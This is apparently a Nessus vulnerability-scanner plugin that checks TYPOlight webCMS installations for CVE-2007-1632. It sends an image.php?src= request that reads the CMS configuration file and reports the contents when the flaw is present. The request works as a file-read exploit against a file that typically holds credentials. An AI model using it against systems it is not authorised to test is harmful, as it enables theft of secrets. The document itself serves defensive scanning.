#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24900);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-1632");
  script_bugtraq_id(23048);
  script_xref(name:"OSVDB", value:"33303");

  script_name(english:"TYPOlight < 2.2.5 Unspecified Vulnerability");
  script_summary(english:"Tries to read a file using TYPOlight");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
major security hole." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TYPOlight webCMS, a content management
system with an emphasis on accessibility and written in PHP. 

The version of TYPOlight installed on the remote host is affected by
what the project calls a 'major security hole', although no specific
details are available at this time." );
 script_set_attribute(attribute:"see_also", value:"http://www.typolight.org/changelog.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to TYPOlight version 2.2.5 or later by using, say, the
application's Live Update feature." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/typolight", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "system/config/localconfig.php";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/image.php?",
      "src=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if we managed to grab the file.
  if ("$GLOBALS" >< res && "TL_CONFIG" >< res)
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of the file '", file, "'\n",
        "that Nessus was able to read from the remote host :\n",
        "\n",
        res
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
